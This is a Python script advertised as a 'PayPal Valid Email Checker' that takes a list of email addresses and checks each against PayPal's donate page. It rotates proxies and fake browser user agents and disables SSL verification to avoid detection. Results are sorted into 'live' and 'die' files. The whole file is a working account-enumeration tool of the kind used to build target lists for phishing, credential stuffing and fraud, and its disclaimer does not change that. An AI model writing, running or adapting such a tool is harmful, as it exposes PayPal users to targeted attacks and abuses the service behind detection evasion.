import requests
import random
import concurrent.futures
import signal
import sys
import re

print("[+] PayPal Valid Email Checker by ./ANNA [+]")
live_file = open('PayPalLive.txt', 'w')
die_file = open('PayPalDie.txt', 'w')
print("_" * 50)
print("PayPal Valid Email Checker by ./ANNA")
print("I don't Accept any Responsibility for any illegal usage!")
print("_" * 55)
print(" ")

# Input the email list file
email_list_filename = input("Input Mail List: ")

# Load proxies from proxies.txt
with open('proxies.txt', 'r') as proxy_file:
    proxies = [line.strip() for line in proxy_file.readlines()]

# List of fake user agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:85.0) Gecko/20100101 Firefox/85.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
]

print("-" * 55)

# Load email list
with open(email_list_filename, 'r') as email_list:
    emails = [email.strip() for email in email_list.readlines()]

# Input number of threads
num_threads = int(input("Enter the number of threads: "))

def check_email(email):
    item_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))
    link = f"https://www.paypal.com/donate?business={email}&item_name={item_name}&currency_code=USD"
    user_agent = random.choice(USER_AGENTS)
    proxy = random.choice(proxies)  # Choose a random proxy
    headers = {
        'User-Agent': user_agent
    }

    # Setup proxy
    proxy_dict = {
        'http': f'http://{proxy}',
        'https': f'https://{proxy}',
    }

    try:
        # Send request with SSL verification disabled (for testing)
        response = requests.get(link, headers=headers, proxies=proxy_dict, timeout=10, verify=False)

        if response.status_code != 200:
            print(f"DIE | {email} | [(Checked)]")
            die_file.write(email + '\n')
            return

        # Check for <meta property="og:title" content=".*?">
        meta_tag_match = re.search(r'<meta property="og:title" content="(.*?)">', response.text)
        if meta_tag_match:
            meta_content = meta_tag_match.group(1)
            print(f"\033[32;1mLIVE\033[0m | {email} | Meta Content: {meta_content} | [(Checked)]")
            live_file.write(email + '\n')
        else:
            print(f"\033[31;1mDIE\033[0m | {email} | [(Checked)]")
            die_file.write(email + '\n')
    except requests.exceptions.ProxyError:
        print(f"DIE | {email} | Error: Unable to connect to proxy.")
        die_file.write(email + '\n')
    except Exception as e:
        print(f"DIE | {email} | Error: {str(e)}")
        die_file.write(email + '\n')


def signal_handler(sig, frame):
    print("\nProcess interrupted. Saving results...")
    live_file.close()
    die_file.close()
    sys.exit(0)

# Setup signal handling to prevent termination with CTRL + Z
signal.signal(signal.SIGINT, signal_handler)

# Use ThreadPoolExecutor to manage threading
with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(check_email, emails)

print("-" * 50)
print("\033[35;1mProcess Checking Done\033[0m")
print("PayPal Valid Emails were saved in PayPalLive.txt and PayPalDie.txt")

live_file.close()
die_file.close()
